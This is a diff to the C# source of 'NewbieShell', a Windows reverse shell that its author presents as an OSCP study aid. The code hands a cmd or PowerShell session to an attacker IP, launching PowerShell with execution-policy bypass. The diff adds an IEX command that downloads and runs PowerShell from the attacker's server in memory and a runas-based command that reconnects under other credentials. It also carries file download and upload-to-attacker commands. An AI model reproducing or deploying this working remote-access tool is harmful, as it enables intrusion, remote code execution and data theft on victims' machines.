@@ -1,7 +1,6 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
-using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
@@ -10,6 +9,11 @@ namespace NewbieShell
 {
     /// <summary>
     /// A Reverse - Shell - Programm for Newbies.
+    /// 
+    /// When preparing for the OSCP certificate. 
+    /// I have seen some reverse shell in action. The most annoying thing for me was that a very long text is needed when downloading and uploading. 
+    /// Because I like to program in C#, I thought to myself. I simplify this a bit. 
+    /// Through this idea, Newbie - Shell was born. With short keywords the attacker has the possibility to list downloads or uploads. This simplifies a lot.
     /// 
     /// Newbieshell.exe [ip] [port] [cmd.exe or powershell.exe]
     /// Example: NewbieShell.exe 192.168.0.1 80 cmd.exe
@@ -90,35 +94,6 @@ namespace NewbieShell
         }
 
         /// <summary>
-        /// Print data on the attacker screen.
-        /// </summary>
-        /// <param name="sendingProcess"></param>
-        /// <param name="outLine"></param>
-        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
-        {
-            StringBuilder sb = new StringBuilder();
-
-            if (!String.IsNullOrEmpty(outLine.Data))
-            {
-                if (outLine.Data.IndexOf('>') > 0 && outLine.Data.Contains("C:\\"))
-                {
-                    //path = outLine.Data.Substring(0, outLine.Data.LastIndexOf('>'));
-                }
-
-                try
-                {
-                    sb.Append(outLine.Data);
-                    sw.WriteLine(sb);
-                    sw.Flush();
-                }
-                catch (Exception err)
-                {
-                    Console.WriteLine(err);
-                }
-            }
-        }
-
-        /// <summary>
         /// Connection
         /// </summary>
         /// <param name="ip">IP - Address</param>
@@ -149,7 +124,7 @@ namespace NewbieShell
                             Process process = new Process();
                             process.StartInfo.FileName = command;
 
-                            //When the command is powershell.exe then write as argument "-ep bypass" to bypass the Powershell
+                            // When the command is powershell.exe then write as argument "-ep bypass" to bypass the Powershell
                             // Execution Policy
                             if (command == "powershell.exe")
                             {
@@ -162,15 +137,13 @@ namespace NewbieShell
                             process.StartInfo.RedirectStandardInput = true;
                             process.StartInfo.RedirectStandardError = true;
                             process.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
-
+                            process.ErrorDataReceived += new DataReceivedEventHandler(CmdErrorDataHandler);
                             try
                             {
                                 process.Start();
                                 process.BeginOutputReadLine();
-                                process.StandardInput.WriteLine("mkdir C:\\temp");
-                                sw.WriteLine("Newbie - Shell create a folder with the name C:\\temp");
-                                sw.Flush();
-
+                                process.BeginErrorReadLine();
+                               
                             }
                             catch (Exception ex)
                             {
@@ -180,7 +153,16 @@ namespace NewbieShell
                                 client.Close();
                                 Environment.Exit(0);
                             }
-                           
+
+                            System.Threading.Thread.Sleep(1000);
+
+                            if (!System.IO.Directory.Exists(path))
+                            {                             
+                                process.StandardInput.WriteLine("mkdir C:\\temp");
+                                sw.WriteLine("Newbie - Shell create a folder with the name C:\\temp");
+                                sw.Flush();
+                            }
+
                             //If the attacker writes something into the terminal, then this command is executed at the victim.
                             while (true)
                             {
@@ -189,32 +171,74 @@ namespace NewbieShell
                                     //Read command from terminal.
                                     sb.Append(rdr.ReadLine());
 
-                                    //The #D - Command stands for "Download". The Attacker can download the data from a web server. 
-                                    //Therefore the system takes the IP - Address from the Reverse Shell and the port 80. 
+                                    //The #D - command stands for "Download". The attacker can download from from the web server. 
+                                    //For this purpose the system takes the IP - address from the reverse shell and the port 80. 
                                     if (sb.ToString().ToUpper() == "#D")
                                     {
-                                        //To save the actual path
-                                        //process.StandardInput.WriteLine("dir");
+                                        sw.WriteLine("Newbie-Shell start download - command");
+                                        sw.WriteLine("Start the  with the command \"python3 - m http.server 80\" on the attacker machine");
+                                        sw.Flush();
 
                                         sb.Remove(0, sb.Length);
 
                                         sw = new StreamWriter(stream);
-                                        sw.Write("Name of the Downloaded File: ");
+                                        sw.Write("Name of the downloaded file: ");
                                         sw.Flush();
 
                                         sb.Append(rdr.ReadLine());
                                         WebClient myWebClient = new WebClient();
                                         string webresource = "http://" + ip + "/" + sb.ToString();
-                                        myWebClient.DownloadFile(webresource, path + "\\" + sb.ToString());
-                                        myWebClient.Dispose();
 
-                                        sw.WriteLine(string.Format("{0} - File is downloaded on {1}", webresource, path));
-                                        sw.Flush();
-                                        sb.Remove(0, sb.Length);
+                                        try
+                                        {
+                                            myWebClient.DownloadFile(webresource, path + "\\" + sb.ToString());
+                                            myWebClient.Dispose();
+
+                                            sw.WriteLine(string.Format("{0} - file is downloaded on {1}", webresource, path));
+                                            sw.Flush();
+                                            sb.Remove(0, sb.Length);
+                                        }
+                                        catch (Exception ex)
+                                        {
+                                            sw.WriteLine(ex.Message);
+                                            sw.Flush();
+                                            sb.Remove(0, sb.Length);
+                                        }
+
                                     }
-                                    // Upload file to the Attacker with CURL. The Attacker can upload the file from the Victim to a Webserver.
-                                    // Therefore the system takes the IP - Address from the Reverse Shell and the port 80.
-                                    // Install the uploadserver "pip3 install uploadserver" and start it with the Command "python3 -m uploadserver 80" on the Attacker Machine.
+                                    //Invoke-Expression
+                                    else if (sb.ToString().ToUpper() == "#IEX")
+                                    {
+                                        sw.WriteLine("Newbie-Shell start IEX - Command");
+                                        sw.WriteLine("Start the  with the command \"python3 - m http.server 80\" on the attacker machine");
+                                        sw.Flush();
+
+                                        sb.Remove(0, sb.Length);
+
+                                        sw = new StreamWriter(stream);
+                                        sw.Write("Downloaded file from memory: ");
+                                        sw.Flush();
+
+                                        string filename = rdr.ReadLine();
+                                        string cmd = string.Format("powershell \"IEX(New-Object Net.WebClient).downloadString('http://{0}/{1}')", ip, filename);
+
+                                        try
+                                        {
+                                            process.StandardInput.WriteLine(cmd);
+                                            sw.WriteLine(string.Format("OK"));
+                                            sw.Flush();
+                                        }
+                                        catch (Exception ex)
+                                        {
+                                            sw.WriteLine(ex.Message);
+                                            sw.Flush();
+                                            Console.WriteLine(ex.Message);
+                                        }
+
+                                    }
+                                    // Upload file to the attacker with CURL. The attacker can upload the file from the victim to a webserver.
+                                    // For this purpose the system takes the IP - address from the reverse shell and the port 80.
+                                    // Install the uploadserver "pip3 install uploadserver" and start it with the command "python3 -m uploadserver 80" on the attacker machine.
                                     // Works only with cmd.exe not with powershell.exe
                                     else if (sb.ToString().ToUpper() == "#U")
                                     {
@@ -227,7 +251,8 @@ namespace NewbieShell
 
                                         sb.Remove(0, sb.Length);
                                         sw = new StreamWriter(stream);
-                                        sw.WriteLine("Install the uploadserver \"pip3 install uploadserver\" on the Attacker Machine");
+                                        sw.WriteLine("Newbie-Shell start upload - command");
+                                        sw.WriteLine("Install the uploadserver \"pip3 install uploadserver\" on the attacker machine");
                                         sw.WriteLine("Start the the uploadserver with this command \"python3 - m uploadserver 80\" on the Attacker Machine");
                                         sw.Write("Full path of the uploaded file: ");
                                         sw.Flush();
@@ -266,11 +291,65 @@ namespace NewbieShell
                                     else if (sb.ToString().ToUpper() == "#H")
                                     {
                                         sw.WriteLine("#D ------> Download file from Attacker! Start python3 -m http.server 80 on the attacker machine");
-                                        sw.WriteLine("#U ------> Upload file to the Attacker! Install the uploadserver \"pip3 install uploadserver\" and start it with the Command \"python3 -m uploadserver 80\")");
+                                        sw.WriteLine("#U ------> Upload file to the Attacker! Install the uploadserver \"pip3 install uploadserver\" and start it with the command \"python3 -m uploadserver 80\")");
+                                        sw.WriteLine("#IEX ------> Invoke-Expression! Start python3 -m http.server 80 on the attacker machine");
+                                        sw.WriteLine("#I --------> Impersonat with new Credentials");
                                         sw.WriteLine("#H ------> Help");
                                         sw.Flush();
                                         sb.Remove(0, sb.Length);
                                     }
+                                    // Impersonat and make a new connection with Newbie-Shell with new Credentials
+                                    else if (sb.ToString().ToUpper() == "#I")
+                                    {
+                                        sb.Remove(0, sb.Length);
+
+                                        sw.WriteLine("Newbie-Shell start Runas / Impersonate");
+                                        sw.WriteLine("Start nc -vlnp " + port + " on the attacker machine");
+                                        sw.Write("Username: ");
+                                        sw.Flush();
+
+                                        string username = rdr.ReadLine();
+
+                                        sw.Write("Password: ");
+                                        sw.Flush();
+                                        string password = rdr.ReadLine();
+
+                                        sw.WriteLine("When no domain then let the field empty");
+                                        sw.Write("Domain: ");
+                                        sw.Flush();
+                                        string domain = rdr.ReadLine();
+
+                                        string exepath = System.Reflection.Assembly.GetCallingAssembly().Location;
+                                        string impersonatecmd = exepath + " " + ip + " " + port + " " + command;
+                                        string cmd = string.Empty;
+
+                                        if (domain == "")
+                                        {
+                                            string HostName = Dns.GetHostName();
+
+                                            cmd = string.Format("runas /netonly /user:{0}\\{1} \"{2}\"", HostName, username, impersonatecmd);
+                                        }
+                                        else
+                                        {
+                                            cmd = string.Format("runas /netonly /user:{0}\\{1} \"{2}\"", domain, username, impersonatecmd);
+                                        }
+
+                                        try
+                                        {
+                                            process.StandardInput.WriteLine(cmd);
+                                            System.Threading.Thread.Sleep(1000);
+                                            process.StandardInput.WriteLine(password);
+                                            sw.WriteLine(string.Format("OK"));
+                                            sw.Flush();
+                                        }
+                                        catch (Exception ex)
+                                        {
+                                            sw.WriteLine(ex.Message);
+                                            sw.Flush();
+                                            Console.WriteLine(ex.Message);
+                                        }
+                                    }
+                                    // Standard command
                                     else
                                     {
                                         try
@@ -307,6 +386,54 @@ namespace NewbieShell
                 Environment.Exit(0);
             }
 
+        }
+
+        /// <summary>
+        /// Print data when error.
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="outLine"></param>
+        private static void CmdErrorDataHandler(object sender, DataReceivedEventArgs outLine)
+        {
+            StringBuilder sb = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    sb.Append(outLine.Data);
+                    sw.WriteLine(sb);
+                    sw.Flush();
+                }
+                catch (Exception err)
+                {
+                    Console.WriteLine(err);
+                }
+            }
+        }
+
+        /// <summary>
+        /// Print data on the attacker screen.
+        /// </summary>
+        /// <param name="sendingProcess"></param>
+        /// <param name="outLine"></param>
+        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder sb = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    sb.Append(outLine.Data);
+                    sw.WriteLine(sb);
+                    sw.Flush();
+                }
+                catch (Exception err)
+                {
+                    Console.WriteLine(err);
+                }
+            }
         }
     }
 }
